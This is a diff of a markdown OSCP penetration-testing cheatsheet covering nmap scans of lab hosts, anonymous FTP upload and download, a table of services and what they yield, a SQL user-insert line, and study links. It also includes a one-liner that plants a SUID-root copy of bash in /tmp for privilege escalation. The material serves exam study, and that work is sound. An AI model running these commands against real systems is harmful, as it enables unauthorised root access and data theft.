@@ -1,17 +1,50 @@
-## PWK/OSCP Cheatsheet
-**Author:** Victor Fernandez III, http://github.com/cyberphor
+## OSCP Cheatsheet
+**Author:** Victor Fernandez III
 
 ### Reconnaissance
+| Network ID | Subnet Mask | Default Gateway | Computers |
+| ---------- | ----------- | --------------- | ---------------- |
+| 10.11.12.0 | 255.255.255.0 | 10.11.12.254 | 5 |
+
+### Enumeration
+| IP Address | Ports | Services | OS |
+| ---------- | ----- | -------- | --- |
+| 10.11.12.13 | 445 | SMB | Windows 10 | 
+| 10.11.12.23 | 25 | SMTP | Debian Linux | 
+| 10.11.12.25 | 2049 | NFS | FreeBSD | 
+| 10.11.12.69 | 22 | SSH | Fedora Linux | 
+| 10.11.12.123 | 80 | HTTP | Windows Server 2012 R2 | 
+
 #### Ports
 ```bash
+TARGET=10.11.12.13
+```
+
+```bash
 sudo nmap $TARGET -sS -sU -oN scans/$TARGET-nmap-initial
+```
+
+```bash
 sudo nmap $TARGET -sS -sU -p- -oN scans/$TARGET-nmap-complete
 ```
 
-### Enumeration
-#### Service Versions
+#### Services
+| Port | Service | Provides |
+| ---- | -------- | -------- |
+| 21   | FTP      | Credentials, File upload |
+| 22   | SSH      | Remote access |
+| 25   | SMTP     | Code execution, Credentials |
+| 80   | HTTP     | Code execution, Credentials |
+| 110  | POP3     | Code execution, Credentials |
+| 111  | NFS      | Credentials |
+| 135  | RPC      | Enumeration |
+| 445  | SMB      | Credentials, Remote access |
+| 873  | Rsync    | File upload |
+| 6667 | IRC      | Credentials |
+
+#### Versions
 ```bash
-sudo nmap $TARGET -sV -sC $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions
+sudo nmap $TARGET -sV -sC $(print-open-ports-from-nmap-scan scans/$TARGET-nmap-complete) -oN scans/$TARGET-nmap-versions
 ```
 
 #### Operating System
@@ -20,15 +53,59 @@ sudo nmap $TARGET -O -oN scans/$NAME-nmap-os
 ```
 
 #### FTP
+I recommend creating and changing directories to a folder called "loot." It's important to stay organized (and you never know when there's something to download). 
 ```bash
+mkdir loot
 cd loot
-touch README.too # create a file
-ftp $TARGET 21 # login using anonymous:anonymous
-put README.too # upload file created above (i.e. check if we have write privileges)
+```
+
+Create a file to test your ability to upload.
+```bash
+touch poo.txt
+```
+
+Login (try using anonymous:anonymous, anonymous:password, guest:guest, etc.).
+```bash
+ftp $TARGET 21
+```
+
+List files.
+```bash
 ls
+```
+
+List files (using Curl). 
+```bash
+curl ftp://anonymous:anonymous@$TARGET:21
+```
+
+Change to Binary mode (an important setting if you're uploading/downloading binary files like pictures and/or executables!). 
+```bash
 binary 
-get file.txt # download a file (i.e. check if we have read privileges)
-mget * # download everything
+```
+
+Download a file.
+```bash
+get file.txt
+```
+
+Download all files.
+```bash
+mget *
+```
+
+Download all files to the current directory (using Wget).
+```bash
+wget -m ftp://anonymous:anonymous@$TARGET:21 -nd
+```
+
+Upload a file.
+```bash
+put poo.txt
+```
+
+End a FTP session.
+```bash
 exit
 ```
 
@@ -240,3 +317,34 @@ Rootbash (Credit: Tib3rius)
 cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
 /tmp/bash -p
 ```
+
+Add a new user to a SQL database
+```sql
+INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
+```
+
+## References
+Local File Inclusions
+- https://www.techsec.me/2020/09/local-file-inclusion-to-rce.html
+- https://packetstormsecurity.com/files/89823/vtiger-CRM-5.2.0-Shell-Upload.html
+
+SQL Injection
+- http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+- https://pentesterlab.com/exercises/from_sqli_to_shell/course
+- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StackingQueries
+- https://www.w3schools.com/tags/ref_urlencode.ASP
+
+Windows
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#user-enumeration
+
+Exam Tips
+- https://markeldo.com/how-to-pass-the-oscp/
+- https://fareedfauzi.gitbook.io/oscp-notes/
+- https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md
+- https://guide.offsecnewbie.com/
+
+Tools
+- https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
+
+Walkthroughs
+- https://www.trenchesofit.com/
